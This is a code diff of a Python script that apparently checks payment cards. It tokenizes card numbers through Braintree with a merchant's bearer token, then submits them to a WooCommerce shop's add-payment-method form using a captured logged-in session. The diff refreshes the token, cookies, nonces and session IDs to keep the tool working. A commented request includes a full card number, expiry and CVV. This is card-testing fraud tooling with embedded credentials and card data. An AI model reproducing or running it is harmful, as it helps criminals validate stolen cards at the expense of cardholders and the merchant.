@@ -28,11 +28,13 @@ def chk(card):
 
 
 
+
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAwMTM4MDAsImp0aSI6ImI4NjdkMzZlLTcyOTUtNDBlMy1iYjRiLTJlZjNhM2RlNGQ0OCIsInN1YiI6IjY1ZjcydHpuZHN3amY0cWYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjY1ZjcydHpuZHN3amY0cWYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.9TucdXxLr9A4bk29mrNRDAYeEUDXUBCkXbVsKXKiJ0CdRoGHjPP1dOm9lnx9AkocPM-xPbJgkQiZtdC-_qe9IA',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAxMTI0ODksImp0aSI6Ijg1MjZhOGQ1LWM3MTUtNGYyYi05MjAzLTY3OTc1YWVlN2EzYiIsInN1YiI6IjY1ZjcydHpuZHN3amY0cWYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjY1ZjcydHpuZHN3amY0cWYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.3FV-TEC24C0OXvlwduDyKU_kBj46hlFzF8_3cg-bF_27rbrA8p7ZoYF9QSXNu-TN3quB3Mpunrhhtr3jjRH-AQ',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -52,7 +54,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'b9244711-70b5-4332-8ada-5c7957c251dc',
+        'sessionId': '75a663e3-aa94-4931-ab6c-c0be37375ac3',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -75,7 +77,7 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b9244711-70b5-4332-8ada-5c7957c251dc"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"75a663e3-aa94-4931-ab6c-c0be37375ac3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
 
@@ -92,19 +94,21 @@ def chk(card):
 
 
 
+
+
 	cookies = {
     '_fbp': 'fb.1.1719845019955.442683768755068518',
     'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': 'moh552vbnm%7C1721054638%7CCg9gMArsIb5k9DbSJw6zUCvVQyefmehrzNo7HpUn8Ve%7C3bd3670604f63c703ddfe15aa8832924a2d4d427c3092680dbf3b86d0107aaa9',
     'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'rls6ud2drfgdm3pfq0ko',
-    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43697%7Cother%7Cread%7Cdc65122730824763b5e04363d7b241672fff1a24ccd9830aba55e5c9e9d5144f',
+    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43697%7Cother%7Cread%7C1995c8f53073c0f89ef886eaa82e127673cad8b2e127dc32f2c4f5816288b81e',
     'wp_automatewoo_session_started': '1',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-07-02%2013%3A36%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-07-02%2013%3A36%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-07-03%2017%3A01%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-07-03%2017%3A01%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
 }
 
 	headers = {
@@ -113,7 +117,7 @@ def chk(card):
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_fbp=fb.1.1719845019955.442683768755068518; wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4=moh552vbnm%7C1721054638%7CCg9gMArsIb5k9DbSJw6zUCvVQyefmehrzNo7HpUn8Ve%7C3bd3670604f63c703ddfe15aa8832924a2d4d427c3092680dbf3b86d0107aaa9; wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4=rls6ud2drfgdm3pfq0ko; wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788=43697%7Cother%7Cread%7Cdc65122730824763b5e04363d7b241672fff1a24ccd9830aba55e5c9e9d5144f; wp_automatewoo_session_started=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-02%2013%3A36%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-02%2013%3A36%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    # 'cookie': '_fbp=fb.1.1719845019955.442683768755068518; wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4=moh552vbnm%7C1721054638%7CCg9gMArsIb5k9DbSJw6zUCvVQyefmehrzNo7HpUn8Ve%7C3bd3670604f63c703ddfe15aa8832924a2d4d427c3092680dbf3b86d0107aaa9; wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4=rls6ud2drfgdm3pfq0ko; wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788=43697%7Cother%7Cread%7C1995c8f53073c0f89ef886eaa82e127673cad8b2e127dc32f2c4f5816288b81e; wp_automatewoo_session_started=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-03%2017%3A01%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-03%2017%3A01%3A24%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
     'origin': 'https://alphawolfnutrition.com',
     'pragma': 'no-cache',
     'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
@@ -135,16 +139,16 @@ def chk(card):
     ('wc-braintree-credit-card-3d-secure-verified', ''),
     ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
     ('wc_braintree_credit_card_payment_nonce', tok,),
-    ('wc_braintree_device_data', '{"correlation_id":"9a00613c4bb695a87ab252c817dea77a"}'),
+    ('wc_braintree_device_data', '{"correlation_id":"ded88b6ee36f0275b8d7cea16205a799"}'),
     ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
     ('wc_braintree_paypal_payment_nonce', ''),
-    ('wc_braintree_device_data', '{"correlation_id":"9a00613c4bb695a87ab252c817dea77a"}'),
+    ('wc_braintree_device_data', '{"correlation_id":"ded88b6ee36f0275b8d7cea16205a799"}'),
     ('wc-braintree-paypal-context', 'shortcode'),
     ('wc_braintree_paypal_amount', '0.00'),
     ('wc_braintree_paypal_currency', 'USD'),
     ('wc_braintree_paypal_locale', 'en_us'),
     ('wc-braintree-paypal-tokenize-payment-method', 'true'),
-    ('woocommerce-add-payment-method-nonce', '1b27ea1a76'),
+    ('woocommerce-add-payment-method-nonce', '447dcee030'),
     ('_wp_http_referer', '/my-account/add-payment-method/'),
     ('woocommerce_add_payment_method', '1'),
 ]
